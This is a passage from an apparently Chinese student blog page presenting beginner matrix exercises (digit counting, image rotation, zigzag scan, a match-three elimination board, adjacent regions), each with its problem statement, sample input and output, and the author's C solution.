class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">7 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">8 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">9 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">10 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">12 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">14 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">15 </span><span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//偷偷用一维数组老师也不知道,反正就是统计各个数字出现次数</span></span><br><span class="line">    <span class="keyword">int</span> n, m, i, num[<span class="number">256</span> * <span class="number">256</span>], <span class="built_in">end</span>[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d "</span>, &amp;n, &amp;m);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n * m; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[i]);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n * m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (num[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">end</span>[<span class="number">0</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">end</span>[<span class="number">1</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">end</span>[<span class="number">2</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">end</span>[<span class="number">3</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:<span class="built_in">end</span>[<span class="number">4</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:<span class="built_in">end</span>[<span class="number">5</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:<span class="built_in">end</span>[<span class="number">6</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:<span class="built_in">end</span>[<span class="number">7</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:<span class="built_in">end</span>[<span class="number">8</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:<span class="built_in">end</span>[<span class="number">9</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:<span class="built_in">end</span>[<span class="number">10</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">11</span>:<span class="built_in">end</span>[<span class="number">11</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">12</span>:<span class="built_in">end</span>[<span class="number">12</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">13</span>:<span class="built_in">end</span>[<span class="number">13</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">14</span>:<span class="built_in">end</span>[<span class="number">14</span>]++; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">15</span>:<span class="built_in">end</span>[<span class="number">15</span>]++; <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">end</span>[i]!=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>, i, <span class="built_in">end</span>[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图像旋转"><a href="#图像旋转" class="headerlink" title="图像旋转"></a>图像旋转</h3><p>问题描述    </p><p>旋转是图像处理的基本操作，在这个问题中，你需要将一个图像顺时针旋转90度。</p><p>计算机中的图像可以用一个矩阵来表示，为了旋转一个图像，只需要将对应的矩阵旋转即可。例如，下面的矩阵（a）表示原始图像，矩阵（b）表示顺时针旋转90度后的图像。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="number">5</span>  <span class="number">3</span>  ---------------&gt; <span class="number">3</span> <span class="number">1</span>         </span><br><span class="line">         ---------------&gt; <span class="number">2</span> <span class="number">5</span></span><br><span class="line"><span class="number">3</span>  <span class="number">2</span>  <span class="number">4</span>  ---------------&gt; <span class="number">4</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p>输入说明    </p><p>输入的第一行包含两个整数n和m，分别表示图像矩阵的行数和列数。1 ≤ n, m ≤ 100。</p><p>接下来n行，每行包含m个非负整数，表示输入的图像，整数之间用空格分隔。</p><p>输出说明    </p><p>输出m行，每行n个整数，表示顺时针旋转90度之后的矩阵，元素之间用空格分隔。</p><p>输入样例    </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">2 </span><span class="number">3</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">5</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">2</span> <span class="number">4</span></span><br></pre></td></tr></table></figure><p>输出样例    </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">3 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">5</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">3</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m,i,j,k,num[<span class="number">100</span>][<span class="number">100</span>],lst[<span class="number">10000</span>];</span><br><span class="line">    <span class="comment">//苟一波,把数据直接输到一维数组上去</span></span><br><span class="line">    <span class="comment">//这道题说是旋转(有空的话可以找规律转过去),但其实就是从右到左竖着排</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;m);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n * m; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;lst[i]);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> (j = n - <span class="number">1</span>,k=<span class="number">0</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">num[i][j] = lst[k++];</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, num[i][j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Z字形扫描"><a href="#Z字形扫描" class="headerlink" title="Z字形扫描"></a>Z字形扫描</h3><p>问题描述    </p><p>在图像编码的算法中，需要将一个给定的方形矩阵进行Z字形扫描(Zigzag Scan)。给定一个m×n的矩阵，Z字形扫描的过程如下图所示。 </p> <img src="007UR4Zcly1ga3a3zpnpaj30ib09nwhb.jpg" alt="Snipaste_2019-12-14_16-35-03.png" style="zoom:50%;" /><p>输入说明    </p><p>数据的第一行为整数n(n&lt;100)，表示矩阵的行和列数；接下来的n行数据，每行分别为n个整数值(每个整数值都不超过1000)，即矩阵的值</p><p>输出说明    </p><p>在一行上输出Z字形扫描得到的整数序列，整数之间用空格分隔</p><p>输入样例    </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">5</span> <span class="number">3</span> <span class="number">9</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">7</span> <span class="number">5</span> <span class="number">6</span></span><br><span class="line"><span class="symbol">9 </span><span class="number">4</span> <span class="number">6</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">7 </span><span class="number">3</span> <span class="number">1</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p>输出样例    </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">5</span> <span class="number">3</span> <span class="number">9</span> <span class="number">7</span> <span class="number">3</span> <span class="number">9</span> <span class="number">5</span> <span class="number">4</span> <span class="number">7</span> <span class="number">3</span> <span class="number">6</span> <span class="number">6</span> <span class="number">4</span> <span class="number">1</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//用的碰壁法,不知道有没有简单点的方法</span></span><br><span class="line">    <span class="keyword">int</span> n, num[<span class="number">100</span>][<span class="number">100</span>], i, j, count = <span class="number">1</span>, x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[i][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, num[x][y]);</span><br><span class="line"><span class="keyword">while</span> (x != n - <span class="number">1</span> || y != n - <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (count % <span class="number">4</span> == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">y++;</span><br><span class="line"><span class="keyword">if</span> (y &lt; n)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, num[x][y]);</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count % <span class="number">4</span> == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (x + <span class="number">1</span> &lt; n &amp;&amp; y - <span class="number">1</span> &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">x++;</span><br><span class="line">y--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, num[x][y]);</span><br><span class="line">&#125;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count % <span class="number">4</span> == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">x++;</span><br><span class="line"><span class="keyword">if</span> (x &lt; n)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, num[x][y]);</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count % <span class="number">4</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (x - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; y + <span class="number">1</span> &lt; n)</span><br><span class="line">&#123;</span><br><span class="line">y++;</span><br><span class="line">x--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, num[x][y]);</span><br><span class="line">&#125;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="消除类游戏"><a href="#消除类游戏" class="headerlink" title="消除类游戏"></a>消除类游戏</h3><p>问题描述</p><p>　　消除类游戏是深受大众欢迎的一种游戏，游戏在一个包含有n行m列的游戏棋盘上进行，棋盘的每一行每一列的方格上放着一个有颜色的棋子，当一行或一列上有连续三个或更多的相同颜色的棋子时，这些棋子都被消除。当有多处可以被消除时，这些地方的棋子将同时被消除。</p><p>　　现在给你一个n行m列的棋盘，棋盘中的每一个方格上有一个棋子，请给出经过一次消除后的棋盘。</p><p>　　请注意：一个棋子可能在某一行和某一列同时被消除。</p><p>输入格式</p><p>　　输入的第一行包含两个整数n, m，用空格分隔，分别表示棋盘的行数和列数。</p><p>　　接下来n行，每行m个整数，用空格分隔，分别表示每一个方格中的棋子的颜色。颜色使用1至9编号。</p><p>输出格式</p><p>　　输出n行，每行m个整数，相邻的整数之间使用一个空格分隔，表示经过一次消除后的棋盘。如果一个方格中的棋子被消除，则对应的方格输出0，否则输出棋子的颜色编号。</p><p>样例输入1</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">4 </span><span class="number">5</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">2</span> <span class="number">3</span> <span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">4</span> <span class="number">5</span> <span class="number">1</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">2</span> <span class="number">1</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">2</span> <span class="number">2</span> <span class="number">4</span> <span class="number">4</span></span><br></pre></td></tr></table></figure><p>样例输出1</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">2 </span><span class="number">2</span> <span class="number">3</span> <span class="number">0</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">4</span> <span class="number">5</span> <span class="number">0</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">2</span> <span class="number">0</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">4</span></span><br></pre></td></tr></table></figure><p>样例输入2</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">4 </span><span class="number">5</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">2</span> <span class="number">3</span> <span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">2</span> <span class="number">1</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">2</span> <span class="number">3</span> <span class="number">3</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p>样例输出2</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">2 </span><span class="number">2</span> <span class="number">3</span> <span class="number">0</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">2</span> <span class="number">0</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>评测用例规模与约定</p><p>所有的评测用例满足：1 ≤ n, m ≤ 30。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//a是原数组,b是消去后的数组,c是临时处理消去用的数组</span></span><br><span class="line">    <span class="keyword">int</span> n, m, a[<span class="number">30</span>][<span class="number">30</span>], i, j, b[<span class="number">30</span>][<span class="number">30</span>], c[<span class="number">30</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cancel</span><span class="params">(<span class="keyword">int</span> *<span class="built_in">line</span>, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;m);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a[i][j]);</span><br><span class="line"><span class="comment">//每次传一个一维数组过去,把消掉,再贴到b中对应位置中</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">c[j] = a[i][j];</span><br><span class="line">cancel(c, m);</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">b[i][j] = c[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//相比之上的,就多一个0的判断,要是是0说明在上面已经消去了,这里就不能原样赋回去了</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">c[j] = a[j][i];</span><br><span class="line">cancel(c, n);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (b[j][i] == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">b[j][i] = c[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, b[i][j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cancel</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">line</span>, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, count, start;</span><br><span class="line">start = <span class="built_in">line</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>, count = <span class="number">1</span>; i &lt; n + <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">line</span>[i] == start)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (count &gt;= <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= i - count; j--)</span><br><span class="line"><span class="built_in">line</span>[j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">start = <span class="built_in">line</span>[i];</span><br><span class="line">count = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="相邻区域"><a href="#相邻区域" class="headerlink" title="相邻区域"></a>相邻区域</h3><p>问题描述    </p><p>一个n行m列的矩阵被划分成t个矩形区域，分别用数字1-t来标识，同一个区域内的元素都用同一个数字标识。如下图所示，一个6行8列的矩阵被分成8个矩形区域，分别用编号1-8标识。当两个小区域之间公用一条边时，称这两个区域相邻，例如下图中区域5的相邻区域有6个，分别为1,2,3,6,7,8，但4并不是它的相邻区域。请写一个程序找出区域k的所有相邻区域。</p><p><img src="007UR4Zcly1ga3a4mm8g2j308405oa9u-1581581291666.jpg" alt="图片1.png"></p><p>输入说明    </p><p>输入第一行为四个整数n，m， t，k，整数之间用空格分隔。n表示矩阵行数（n&lt;20），m表示矩阵列数（m&lt;20），t表示矩阵被划分为t个矩形区域<code>（0&lt;t&lt;50）</code>，k为其中某个区域的编号（1&lt;=k&lt;=t）。接下来是n行数据，每行m个整数，表示矩阵内各个元素所在的区域，整数之间用空格分隔。</p><p>输出说明    </p><p>输出为一个整数，表示与k相邻的区域个数</p><p>输入样例    </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">6 </span><span class="number">8</span> <span class="number">8</span> <span class="number">5</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">1</span> <span class="number">2</span> <span class="number">2</span> <span class="number">2</span> <span class="number">3</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">1</span> <span class="number">2</span> <span class="number">2</span> <span class="number">2</span> <span class="number">3</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">1</span> <span class="number">2</span> <span class="number">2</span> <span class="number">2</span> <span class="number">3</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">1</span> <span class="number">5</span> <span class="number">5</span> <span class="number">5</span> <span class="number">5</span> <span class="number">5</span> <span class="number">6</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">1</span> <span class="number">5</span> <span class="number">5</span> <span class="number">5</span> <span class="number">5</span> <span class="number">5</span> <span class="number">6</span></span><br><span class="line"><span class="symbol">7 </span><span class="number">7</span> <span class="number">7</span> <span class="number">7</span> <span class="number">7</span> <span class="number">8</span> <span class="number">8</span> <span class="number">8</span></span><br></pre></td></tr></table></figure><p>输出样例    </p><p><code>6</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span 